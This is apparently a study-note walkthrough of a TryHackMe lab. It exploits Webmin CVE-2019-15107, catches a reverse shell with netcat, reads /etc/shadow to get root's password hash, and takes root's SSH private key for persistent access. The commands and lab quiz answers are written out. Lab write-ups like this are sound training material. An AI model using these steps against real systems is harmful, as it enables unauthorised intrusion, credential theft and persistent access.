In the previous task we found a vulnerable service[[1]](https://sensorstechforum.com/cve-2019-15107-webmin/)[[2]](https://www.webmin.com/exploit.html) running on the target which will give us the ability to execute commands on the target.

The next step would usually be to find an exploit for this vulnerability. There are often exploits available online for known vulnerabilities (and we will cover searching for these in an upcoming task!), however, in this instance, an exploit is provided [here](https://github.com/MuirlandOracle/CVE-2019-15107).

---

Start by cloning the repository. This can be done with the following command:

`git clone https://github.com/MuirlandOracle/CVE-2019-15107`  

This creates a local copy of the exploit on our attacking machine. Navigate into the folder then install the required Python libraries:

`cd CVE-2019-15107 && pip3 install -r requirements.txt`  

If this doesn't work, you may need to install pip before downloading the libraries. This can be done with:  
`sudo apt install python3-pip`  

The script should already be executable, but if not, add the executable bit (`chmod +x ./CVE-2019-15107.py`).

Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it's doing. (Don't worry if you aren't familiar with Python -- in this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn't malicious. It is, however, good practice to read through scripts before running them).  

Once you're satisfied that the script will do what it says it will, run the exploit against the target!

`./CVE-2019-15107.py TARGET_IP`

![[Exploitation-20241127151137527.webp]]


[1] [https://sensorstechforum.com/cve-2019-15107-webmin/](https://sensorstechforum.com/cve-2019-15107-webmin/)  
[2] [https://www.webmin.com/exploit.html](https://www.webmin.com/exploit.html)

Run the following command to get the user.
```
# whoami
```

![[Exploitation-20241127151941324.webp]]

> [!Success]
>We won't need to escalate privileges here, so we can move on to the next step in the exploitation process. Before we do though: nice though this pseudoshell is, it's not a full reverse shell. Get a reverse shell from the target. You can either do this manually, or by typing `shell` into the pseudoshell and following the instructions given.

> [!question]
>Which user was the server running as?
>`root'
## Shell

- Type `shell` and introduce the ATTACKING MACHINE IP and a port.


![[Exploitation-20241129143642892.webp]]

- Open a `netcat` connection on the #Attacking_Machine .

```
$ nc -lnvp <port>
```

You'll have a reverse shell.


## Stabilize the reverse shell

Stabilizing a **reverse shell** is crucial for maintaining a reliable connection and improving usability.

**Optional:** Stabilise the reverse shell. There are several techniques for doing this detailed [here](https://tryhackme.com/room/introtoshells).

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ export TERM=xterm

```


## root user's password hash

Run the following command on the reverse shell:

```
# cat /etc/shadow
```

![[Exploitation-20241129144943322.webp]]

### **Hash Components**

1. **Hashing Algorithm**:  
    `$6$` signifies the use of **SHA-512** hashing.
    
2. **Salt**:  
    `i9vT8tk3SoXXxK2P` is the salt used in this hash. It randomizes the hash computation to ensure uniqueness, even if two users have the same password.
    
3. **Hash Value**:  
    `HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1` is the actual hash of the password combined with the salt.
    
4. **Remaining Fields**:  
    The `::0:99999:7:::` part relates to password aging and policy settings:
    
    - `0`: Minimum number of days before the password can be changed.
    - `99999`: Maximum number of days the password is valid.
    - `7`: Warning days before the password expires.
    - `:::`: Reserved fields, typically empty.


> [!question]
>Now for a little post-exploitation!What is the root user's password hash?
>`$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1`


## Consistent access to the root user account

You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.

One of the services on the machine is SSH.

The **SSH (Secure Shell) service** is a network protocol that allows secure remote login and command execution over an encrypted connection. It is widely used to manage Linux/Unix systems remotely.

### **Key Features of SSH**

1. **Encryption**: All data transmitted between the client and server is encrypted.
2. **Authentication**:
    - Password-based authentication.
    - Key-based authentication using SSH keys.
3. **Port Forwarding**: Securely forward ports over an SSH connection.
4. **File Transfer**: Tools like `scp` and `sftp` are built on SSH for secure file transfer.
5. **Tunneling**: Encrypt network traffic for other applications (e.g., SOCKS proxy).

### **SSH Key Files Overview**

When you generate an SSH key pair, two files are created:

1. `id_rsa`: The private key (keep this secure and never share it).
2. `id_rsa.pub`: The public key (this can be shared and placed on the remote server).

These files are usually stored in the `~/.ssh/` directory on your Linux machine.

> [!question]
>What is the full path to this file?
>`/root/.ssh/id_rsa`

Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command `chmod 600 KEY_NAME` (substituting in the name of the key) to obtain persistent access to the box.  

## Connect via SSH to prod-serv

Connect to the prod-server (10.200.84.200) via SSH.
```
ssh root@10.200.84.200 -i id_rsa
```




We have everything we need for now. Let's move on to the next section: Pivoting!

**Next section:** [[What is Pivoting?]]